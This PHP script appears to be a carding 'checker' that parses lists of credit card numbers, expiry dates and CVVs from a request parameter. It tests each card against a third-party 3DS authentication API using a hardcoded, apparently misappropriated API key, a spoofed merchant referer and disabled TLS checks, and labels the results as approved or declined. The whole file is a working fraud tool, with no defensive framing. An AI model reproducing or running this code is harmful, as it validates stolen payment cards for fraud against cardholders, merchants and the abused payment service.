<?php

error_reporting(0);

  $lista = str_replace(array(" "), '/', $_GET['lista']);
  $regex = str_replace(array(':',";","|",",","=>","-"," ",'/','|||'), "|", $lista);

  if (!preg_match("/[0-9]{15,16}\|[0-9]{2}\|[0-9]{2,4}\|[0-9]{3,4}/", $regex,$lista)){
  die('<span class="text-danger">Reprovada</span> ➔ <span class="text-white">'.$lista.'</span> ➔ <span class="text-danger"> Lista inválida. </span> ➔ <span class="text-warning">@pladixoficial</span><br>');
  }

function multiexplode($delimiters, $string)
{
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}

function GetStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

function puxar($separa, $inicia, $fim, $contador){
  $nada = explode($inicia, $separa);
  $nada = explode($fim, $nada[$contador]);
  return $nada[0];
}

$lista = $_REQUEST['lista'];
$cc = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[0];
$mes = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[1];
$ano = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[2];
$cvv = multiexplode(array(":", "|", ";", ":", "/", " "), $lista)[3];

if(strlen($ano) == 2){
    $ano = substr($ano, -2);}
    else{
    $ano = substr($ano, 2);

}
        
if(strlen($mes) == 1){
    $mes = "0".$mes;
}

$url = "https://api.3dsintegrator.com/v2.2/authorize";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_HEADER, 1);

$headers = array(
   "accept: application/json",
   "X-3DS-API-KEY: 6b2a8fd007ce0f43b3ad49dfb9d69c3d",
   "referer: https://bill.ccbill.com",
   "Content-Type: application/json",
   "Content-Length: 0",
);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
$jwtauthorize = curl_exec($curl);



$padrao = '/authorization:\sBearer\s(.*?)\s/';

if (preg_match($padrao, $jwtauthorize, $correspondencias)) {
    $token_bearer = $correspondencias[1];
}



$url = "https://api.3dsintegrator.com/v2.2/authenticate/browser";

$data = '{
  "browser": {
    "browserAcceptHeader": "application/json",
    "browserLanguage": "en-US",
    "browserColorDepth": "48",
    "browserScreenWidth": "1920",
    "browserScreenHeight": "1080",
    "browserTZ": "240",
    "browserUserAgent": "Mozilla/5.0 (iPhone; CPU iPhone OS 12_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1",
    "browserJavaScriptEnabled": true,
    "browserJavaEnabled": true
  },
  "amount": 150.25,
  "month": "'.$mes.'",
  "year": "'.$ano.'",
  "pan": "'.$cc.'",
  "protocolVersion": "2.1.0",
  "threeDSRequestorURL": "https://bill.ccbill.com"
}';

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_HEADER, 0);

$headers = array(
  "accept: application/json",
  "X-3DS-API-KEY: 6b2a8fd007ce0f43b3ad49dfb9d69c3d",
  "referer: https://bill.ccbill.com",
  "Content-Type: application/json",
  "Authorization: Bearer $token_bearer",
);

curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
$responsegate = curl_exec($curl);

$gatewaytokenid = puxar($responsegate, '"transactionId":"','"' , 1);

if($gatewaytokenid === null){
    
die("Erro -> $responsegate");
    
}

/* {"protocolVersion":"2.1.0","correlationId":"2980ef05-ddff-472a-b3eb-fd91139c58f6","transactionId":"512d3b44-121a-4150-b4cb-d64fa8d16f4d","scaIndicator":false} */

$url = "https://api.3dsintegrator.com/v2.2/transaction/$gatewaytokenid/updates";

$curl = curl_init($url);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, false);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_HEADER, 0);

$headers = array(
  "accept: application/json",
  "X-3DS-API-KEY: 6b2a8fd007ce0f43b3ad49dfb9d69c3d",
  "referer: https://bill.ccbill.com",
  "Content-Type: application/json",
  "Authorization: Bearer $token_bearer",
);

curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
echo $response = curl_exec($curl);

/* {
status: "N",
protocolVersion: "2.1.0",
dsTransId: "733242a6-ecff-45a0-8604-590f19660c31",
acsTransId: "733242a6-ecff-45a0-8604-590f19660c31",
cardToken: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJ7XCJ0b2tlblwiOlwiQVFJQ0FIam1TbXhzMHFiTC1PbU0tZ2dnZ1huekhSVWJLQVlvSy1IRHYwWTI1NjlfY1FGaG5SamppVmRVdHFBZ2RXRGozS04zQUFBQWJqQnNCZ2txaGtpRzl3MEJCd2FnWHpCZEFnRUFNRmdHQ1NxR1NJYjNEUUVIQVRBZUJnbGdoa2dCWlFNRUFTNHdFUVFNUndBa05jYzVlXzJ5VlB6UkFnRVFnQ3RYZGF5OUhzLTk3U0t0djUwMWJJYnFuN1ZtTGZBUnQyR3FVRjFjNGt1b3J4WFVlTGRDVE1hM3ExNmxcIixcInRva2VuX2FkYXB0ZXJcIjpcIktNU1wiLFwicmVmZXJlbmNlX251bWJlclwiOlwiYXJuOmF3czprbXM6dXMtZWFzdC0xOjY0MDc4MDM3MTU3NzprZXkvbXJrLTYyYjE3NDdkYWZjODRlZjA4ZTJkMjcxYjM0OTc1YWEwXCJ9IiwiZXhwIjoxNzA1MTc0OTA2LCJqdGkiOiIwZDE1MjljYy0yM2E1LTQ2NmQtOTZiMS1iYTAzZDIxOWYxYjgiLCJpYXQiOjE3MDUxNzQwMDYsImlzcyI6InRva2VuaXphdGlvbi1zZXJ2ZXIifQ.bgpfi2W1qB-EEyJ2tFLgKPmgxuvJubrrJz7Tb4TAlYc",
scaIndicator: false,
transStatusReason: "08",
transStatusReasonDetail: "No Card record"
}

*/

// if(strpos($response, '","cardToken":"')){
    
// echo "Aprovada -> $response";
    
// }else{
    
// echo "Erro -> $response";
    
// }

?>

